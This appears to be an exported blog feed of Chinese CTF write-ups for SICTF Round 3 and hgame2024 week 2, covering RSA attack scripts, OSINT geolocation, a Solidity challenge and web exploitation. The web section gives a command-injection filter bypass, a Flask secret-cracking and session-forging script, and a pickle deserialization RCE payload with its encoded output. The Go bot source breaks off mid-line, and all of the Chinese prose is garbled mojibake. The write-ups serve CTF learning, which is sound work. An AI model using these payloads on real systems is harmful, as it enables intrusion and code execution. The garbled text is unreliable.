class="number">276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529</span></span><br><span class="line">c2= <span class="number">11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021</span></span><br><span class="line">e1=<span class="number">55</span></span><br><span class="line">e2=<span class="number">200</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">s,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line">m=(<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n))%n</span><br><span class="line">m = gmpy2.iroot(m,s)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># SICTF&#123;S0_Great_RSA_Have_Y0u_Learned?&#125;</span></span><br></pre></td></tr></table></figure><h2 id="gggcccddd"><a href="#gggcccddd" class="headerlink" title="gggcccddd"></a>gggcccddd</h2><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(<span class="number">233</span>*m+<span class="number">9527</span>,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 71451784354488078832557440841067139887532820867160946146462765529262021756492415597759437645000198746438846066445835108438656317936511838198860210224738728502558420706947533544863428802654736970469313030584334133519644746498781461927762736769115933249195917207059297145965502955615599481575507738939188415191</span></span><br><span class="line"><span class="string">c1 = 60237305053182363686066000860755970543119549460585763366760183023969060529797821398451174145816154329258405143693872729068255155086734217883658806494371105889752598709446068159151166250635558774937924668506271624373871952982906459509904548833567117402267826477728367928385137857800256270428537882088110496684</span></span><br><span class="line"><span class="string">c2 = 20563562448902136824882636468952895180253983449339226954738399163341332272571882209784996486250189912121870946577915881638415484043534161071782387358993712918678787398065688999810734189213904693514519594955522460151769479515323049821940285408228055771349670919587560952548876796252634104926367078177733076253</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>Franklin-Reiter attackï¼Œå¥—æ¿å­ç”¨sageç¡¬è·‘å‡ºæ¥ï¼Œè¦ç­‰å¾ˆä¹…ã€‚</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n = <span class="number">71451784354488078832557440841067139887532820867160946146462765529262021756492415597759437645000198746438846066445835108438656317936511838198860210224738728502558420706947533544863428802654736970469313030584334133519644746498781461927762736769115933249195917207059297145965502955615599481575507738939188415191</span></span><br><span class="line">c1 = <span class="number">60237305053182363686066000860755970543119549460585763366760183023969060529797821398451174145816154329258405143693872729068255155086734217883658806494371105889752598709446068159151166250635558774937924668506271624373871952982906459509904548833567117402267826477728367928385137857800256270428537882088110496684</span></span><br><span class="line">c2 = <span class="number">20563562448902136824882636468952895180253983449339226954738399163341332272571882209784996486250189912121870946577915881638415484043534161071782387358993712918678787398065688999810734189213904693514519594955522460151769479515323049821940285408228055771349670919587560952548876796252634104926367078177733076253</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">a = <span class="number">233</span></span><br><span class="line">b = <span class="number">9527</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2,a,b</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (x)^e - c1</span><br><span class="line">    g2 = (a*x+b)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic() <span class="comment"># </span></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">m=franklinReiter(n,e,c1,c2,a,b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SICTF&#123;45115fb2-84d6-4369-88c2-c8c3d72b4c55&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="ç­¾åˆ°-OSINTç­¾åˆ°"><a href="#ç­¾åˆ°-OSINTç­¾åˆ°" class="headerlink" title="[ç­¾åˆ°]OSINTç­¾åˆ°"></a>[ç­¾åˆ°]OSINTç­¾åˆ°</h2><p>ç™¾åº¦è¯†å›¾å¯ä»¥çœ‹åˆ°ç±»ä¼¼çš„å›¾ç‰‡ï¼Œå¾—åˆ°åœ°ç‚¹ä¸º<code>çº¢åŸæ¹–</code></p><p><img src="/./SICTF_Round3/s_1_1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SICTF&#123;æµ·å—çœ_æµ·å£å¸‚_ç¼å±±åŒº_çº¢åŸæ¹–å…¬å›­&#125;</span><br></pre></td></tr></table></figure><h2 id="æ ‘æœ¨çš„å‹è¿«"><a href="#æ ‘æœ¨çš„å‹è¿«" class="headerlink" title="æ ‘æœ¨çš„å‹è¿«"></a>æ ‘æœ¨çš„å‹è¿«</h2><p>æŠŠçº¢çº¿éƒ¨åˆ†åˆ‡ä¸‹æ¥å»ç™¾åº¦è¯†å›¾ï¼Œå¯ä»¥çŸ¥é“è¿™æ˜¯ <code>è¾¾å·å¸‚ä½“è‚²ä¸­å¿ƒ</code></p><p><img src="/./SICTF_Round3/s_3_1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SICTF&#123;å››å·çœ_è¾¾å·å¸‚_é€šå·åŒº_å‡¤å‡°å¤§é“376å·_è¾¾å·å¸‚ä½“è‚²ä¸­å¿ƒ&#125;</span><br></pre></td></tr></table></figure><h2 id="è¿™æ‰æ˜¯ç­¾åˆ°"><a href="#è¿™æ‰æ˜¯ç­¾åˆ°" class="headerlink" title="è¿™æ‰æ˜¯ç­¾åˆ°"></a>è¿™æ‰æ˜¯ç­¾åˆ°</h2><p>googleè¯†å›¾ï¼Œå¯ä»¥çŸ¥é“è¿™æ˜¯åœ¨ <strong>æ„å¤§åˆ©çš„å¨å°¼æ–¯</strong>ã€‚</p><p><img src="/./SICTF_Round3/s_2_1.png"></p><p><img src="/"></p><p>æ¥ç€ç”¨è°·æ­Œåœ°å›¾æ‰¾ <strong>è¾¾æ¶…åˆ©é…’åº—</strong>é™„è¿‘ï¼Œå¯ä»¥æ‰¾åˆ°  <strong>Gondola Danieli</strong></p><p><img src="/./SICTF_Round3/s_2_2.png"></p><p>å¯¹ç€ä¸Šé¢å›¾çš„æ‰€æœ‰å¯è§åœ°ç‚¹çˆ†ç ´ï¼Œå¯ä»¥çŸ¥é“ç›®çš„åœ°æ˜¯ <strong>Chiesa di San Zaccaria</strong> ï¼ˆåˆ«å­¦</p><p>flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SICTF&#123;æ„å¤§åˆ©_å¨å°¼æ–¯_GondolaDanieli_ChiesadiSanZaccaria&#125;</span><br></pre></td></tr></table></figure><h2 id="çœŸçš„ç­¾åˆ°"><a href="#çœŸçš„ç­¾åˆ°" class="headerlink" title="çœŸçš„ç­¾åˆ°"></a>çœŸçš„ç­¾åˆ°</h2><p>æŠŠæ‘©å¤©è½®åˆ‡ä¸‹æ¥ç™¾åº¦è¯†å›¾ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ª <strong>å¤§ä¿¡æ–°éƒ½æ±‡</strong> æ—è¾¹çš„æ‘©å¤©è½®ã€‚</p><p><img src="/./SICTF_Round3/s_4_1.png"></p><p>ç„¶åæ ¹æ® <a href="https://www.ixigua.com/6831158277674369550?wid_try=1">è¿™ä¸ªè§†é¢‘</a> å¯ä»¥çŸ¥é“æ˜¯åœ¨ <strong>é»„æ¨æ²³</strong>è¾¹</p><p><img src="/./SICTF_Round3/s_4_2.png"></p><p>flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SICTF&#123;å¹¿ä¸œçœ_ç æµ·å¸‚_æ–—é—¨åŒº_å¤§ä¿¡æ–°éƒ½æ±‡&#125;</span><br></pre></td></tr></table></figure><h1 id="blockchain"><a href="#blockchain" class="headerlink" title="blockchain"></a>blockchain</h1><h2 id="CheckinNewYear"><a href="#CheckinNewYear" class="headerlink" title="CheckinNewYear"></a>CheckinNewYear</h2><p>ncè¿æ¥ï¼Œå¸¸è§„124ï¼Œå‚è€ƒé“¾æ¥ï¼š<a href="https://www.bilibili.com/video/BV1Xe4y1e7sQ/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=abef91c9524f8373b84bcdb481407372">ã€CTFã€‘åŒºå—é“¾â€“åˆçº¦é¢˜å…¥é—¨æ“ä½œ åŒºå—é“¾é¢˜å‹ç®€ä»‹ æ°´é¾™å¤´çš„å¯¹æ¯” remixIDEçš„åŸºæœ¬ä½¿ç”¨ 1â€”â€”NewStarCTF</a></p><p>æºç ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.9</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">HappyNewYear</span>&#123;</span><br><span class="line">    string private <span class="title class_">NewYear</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">string memory _newyear </span>)  &#123;</span><br><span class="line">        <span class="title class_">NewYear</span> = _newyear;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">happyNewYear</span>(<span class="params">string memory _newYear</span>) public payable &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">uint160</span>(msg.<span class="property">sender</span>) |</span><br><span class="line">        <span class="number">2</span>**<span class="number">16</span> * <span class="number">3</span>**<span class="number">3</span> * <span class="number">5</span> * <span class="number">7</span> * <span class="number">13</span> * <span class="number">17</span> * <span class="number">19</span> * <span class="number">37</span> * <span class="number">73</span> * <span class="number">97</span> * <span class="number">109</span> * <span class="number">241</span> * <span class="number">257</span> * <span class="number">433</span> * <span class="number">577</span> * <span class="number">673</span> * <span class="number">38737</span> * <span class="number">487824887233</span> ==</span><br><span class="line">        <span class="number">2</span>**<span class="number">2</span> * <span class="number">17</span> * <span class="number">67</span> * <span class="number">733</span> * <span class="number">316139</span> * <span class="number">18992431891</span> * <span class="number">72887484710091183279372959</span></span><br><span class="line">        ,<span class="string">&quot;Not this Year&quot;</span>);</span><br><span class="line">        <span class="title class_">NewYear</span> = _newYear;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">function</span> <span class="title function_">isSolved</span>(<span class="params"></span>) public view returns (bool)&#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="title class_">NewYear</span>)) == <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="string">&quot;Happy&quot;</span>)),<span class="string">&quot;not HappyNewYear&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è°ƒç”¨<code>happyNewYear</code>ç»™<code>NewYear</code>èµ‹å€¼ä¸º<code>Happy</code>å°±è¡Œäº†ï¼Œä½†åœ¨èµ‹å€¼ä¹‹å‰ä¼šå¯¹æˆ‘ä»¬çš„åœ°å€è¿›è¡Œæ£€æŸ¥ï¼Œè¦æ±‚ç»“å°¾æ˜¯<code>0x2024</code>ã€‚</p><p>é‚£ä¹ˆå¯ä»¥å»åˆ›å»ºä¸€ä¸ªåç¼€æ˜¯<code>0x2024</code>çš„è™šæ‹Ÿçš„åœ°å€ã€‚</p><p>å‚è€ƒé“¾æ¥:<a href="https://www.cnblogs.com/briyctf/p/16753799.html">NewStarCTF Week3 Blockchain </a></p><p>é€šè¿‡ <a href="https://vanity-eth.tk/">è¿™ä¸ªç½‘ç«™</a> å¯ä»¥å¸®åŠ©æˆ‘ä»¬è·å¾—æŒ‡å®šå‰ç¼€æˆ–è€…åç¼€çš„ä»¥å¤ªåœ°å€è´¦å·ã€‚</p><p>æŒ‡å®šåå››ä½ä¸º2024ï¼Œä¸€æ®µæ—¶é—´åå¾—åˆ°ç¬¦åˆè¦æ±‚çš„åœ°å€ï¼Œé€šè¿‡ç§é’¥å¯¼å…¥Metamask</p><p><img src="/./SICTF_Round3/b_1_1.png"></p><p>ç„¶åæŠŠremixä¸Šçš„è´¦æˆ·æ”¹æˆæ–°å»ºçš„è´¦æˆ·ï¼Œå…ˆè¿›è¡Œchooseoneï¼Œå¾…äº¤æ˜“å®Œæˆåç»™<code>happyNewYear</code>ä¼ <code>Happy</code>å³å¯ã€‚</p><p>1é‡Œé¢å¡«ä¸Šæ”»å‡»åœ°å€ï¼Œ2é‡Œé¢å¡«ä¸Šè¦ä¼ çš„å€¼ï¼Œå³<code>Happy</code>ï¼Œæœ€å<code>isSolved</code>å³å¯ã€‚</p><p><img src="/./SICTF_Round3/b_1_2.png"></p><p>ncæŸ¥çœ‹3å³å¯å¾—åˆ°flagã€‚</p><p><img src="/./SICTF_Round3/b_1_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> write up </category>
          
          <category> SICTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> web </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2024_week2 WP</title>
      <link href="/hgame2024_week2/"/>
      <url>/hgame2024_week2/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a>What the cow say?</h2><p>å°è¯•  <strong>`ls`</strong> å¯ä»¥å‘ç°èƒ½æ‰§è¡Œå‘½ä»¤ã€‚</p><p>æŸ¥çœ‹æ ¹ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°<code>flag_is_here</code>ç›®å½•ï¼ŒæŸ¥çœ‹<code>flag_is_here</code>ï¼Œå¯ä»¥çœ‹åˆ°<code>flag_c0w54y</code>ã€‚</p><p>è¿‡æ»¤äº†<code>cat</code>ï¼Œä½†<code>?</code>æ²¡è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨<code>/bin/c?t</code>æ¥ä»£æ›¿<code>cat</code>æŸ¥çœ‹æ–‡ä»¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user_input=`/bin/c?t /f*/f*`</span><br></pre></td></tr></table></figure><p><img src="/"><img src="/./hgame2024_week2/w_1_1.png" alt="w_1_1"></p><h2 id="myflask"><a href="#myflask" class="headerlink" title="myflask"></a>myflask</h2><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, send_file</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> pytz <span class="keyword">import</span> timezone</span><br><span class="line"></span><br><span class="line">currentDateAndTime = datetime.now(timezone(<span class="string">&#x27;Asia/Shanghai&#x27;</span>))</span><br><span class="line">currentTime = currentDateAndTime.strftime(<span class="string">&quot;%H%M%S&quot;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># Tips: Try to crack this first â†“</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = currentTime</span><br><span class="line"><span class="built_in">print</span>(currentTime)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;app.py&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;There is no session available in your client :(&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="built_in">format</span>(session[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># For POST requests from admin</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        pickle_data=base64.b64decode(request.form.get(<span class="string">&#x27;pickle_data&#x27;</span>))</span><br><span class="line">        <span class="comment"># Tips: Here try to trigger RCE</span></span><br><span class="line">        userdata=pickle.loads(pickle_data)</span><br><span class="line">        <span class="keyword">return</span> userdata</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access Denied&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>é€šè¿‡æºç ï¼Œå¯ä»¥çŸ¥é“<code>SECRET_KEY</code>æ˜¯6ä½æ•°çš„çº¯æ•°å­—ï¼Œå¯ä»¥çˆ†ç ´</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> flask_unsign</span><br><span class="line"><span class="keyword">from</span> flask_unsign.helpers <span class="keyword">import</span> wordlist</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;wordlist.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Generating wordlist... &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”Ÿæˆçˆ†ç ´å­—å…¸</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    [f.write(<span class="string">&quot;&quot;</span>.join(x)+<span class="string">&quot;\n&quot;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> itertools.product(<span class="string">&#x27;0123456789&#x27;</span>, repeat=<span class="number">6</span>)]<span class="comment">#ç”Ÿæˆæ¡ä»¶</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¡«éœ€è¦çˆ†ç ´çš„session</span></span><br><span class="line">cookie_tamper = <span class="string">&quot;eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZcEzTg.YXSvJEMzC1MuPiDKMXDtTXMi3zU&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Got cookie: &quot;</span> + cookie_tamper)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cracker Started...&quot;</span>)</span><br><span class="line"></span><br><span class="line">obj = flask_unsign.Cracker(value=cookie_tamper)</span><br><span class="line"></span><br><span class="line">before = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> wordlist(path, parse_lines=<span class="literal">False</span>) <span class="keyword">as</span> iterator:</span><br><span class="line">            obj.crack(iterator)</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> obj.secret:</span><br><span class="line">    secret = obj.secret.decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Found SECRET_KET <span class="subst">&#123;secret&#125;</span> in <span class="subst">&#123;time.time()-before&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line">signer = flask_unsign.sign(&#123;<span class="string">&quot;time&quot;</span>:time.time(),<span class="string">&quot;authorized&quot;</span>:<span class="literal">True</span>&#125;,secret=secret)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>SECRET_KEY</code>ä¸º <code>155018</code> ã€‚</p><p>æ¥ä¸‹æ¥æ˜¯ä½¿ç”¨ <a href="https://github.com/noraj/flask-session-cookie-manager">flask-session-cookie-manager</a> æ¥sessionä¼ªé€ ã€‚</p><p>æŠŠä¼ªé€ åçš„sessionæ”¾è¿›cookieï¼Œè®¿é—®<code>/flag</code>è·¯ç”±ï¼Œæ¥ç€æ˜¯<code>pickle</code>ååºåˆ—åŒ–ã€‚</p><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç”¨<code>__reduce__</code>å°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>,))<span class="comment">#popenå†…è¾“å…¥å‘½ä»¤</span></span><br><span class="line">    </span><br><span class="line">a = A()</span><br><span class="line">a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a))</span><br><span class="line"><span class="comment"># b&#x27;gASVRgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwqX19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IC9mbGFnJykucmVhZCgplIWUUpQu&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/w_2_1.png"></p><h2 id="æ¢…å¼€äºŒåº¦"><a href="#æ¢…å¼€äºŒåº¦" class="headerlink" title="æ¢…å¼€äºŒåº¦"></a>æ¢…å¼€äºŒåº¦</h2><p>æºç ï¼š</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;context&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/url&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;regexp&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;text/template&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/chromedp/chromedp&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;golang.org/x/net/html&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> re = regexp.MustCompile(<span class="string">`script|file|on`</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> lock sync.Mutex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), <span class="built_in">append</span>(chromedp.DefaultExecAllocatorOptions[:],</span><br><span class="line">chromedp.NoSandbox, chromedp.DisableGPU)...)</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">tmplStr := c.Query(<span class="string">&quot;tmpl&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> tmplStr == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">tmplStr = defaultTmpl</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> re.MatchString(tmplStr) &#123;</span><br><span class="line">c.String(<span class="number">403</span>, <span class="string">&quot;tmpl contains invalid word&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(tmplStr) &gt; <span class="number">50</span> &#123;</span><br><span class="line">c.String(<span class="number">403</span>, <span class="string">&quot;tmpl is too long&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">tmplStr = html.EscapeString(tmplStr)</span><br><span class="line">&#125;</span><br><span class="line">tmpl, err := template.New(<span class="string">&quot;resp&quot;</span>).Parse(tmplStr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;parse template error: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := tmpl.Execute(c.Writer, c); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;execute template error: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/bot&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">rawURL := c.Query(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">u, err := url.Parse(rawURL)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">403</span>, <span class="string">&quot;url is invalid&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> u.Host != <span class="string">&quot;127.0.0.1:8080&quot;</span> &#123;</span><br><span class="line">c.String(<span class="number">403</span>, <span class="string">&quot;host is invalid&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">lock.Lock()</span><br><span class="line"><span class="keyword">defer</span> lock.Unlock()</span><br><span class="line"></span><br><span class="line">ctx, cancel := chromedp.NewContext(allocCtx,</span><br><span class="line">chromedp.WithBrowserOption(chromedp.WithDialTimeout(<span class="number">10</span>*time.Second)),</span><br><span class="line">)</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line">ctx, _ = context.WithTimeout(ctx, <span class="number">20</span>*time.Second)</span><br><span class="line"><span class="keyword">if</span> err := chromedp.Run(ctx,</span><br><span class="line">chromedp.Navigate(u.String()),</span><br><span class="line">chromedp.Sleep(time.Second*<span class="number">10</span>),</span><br><span class="line">); err != <span 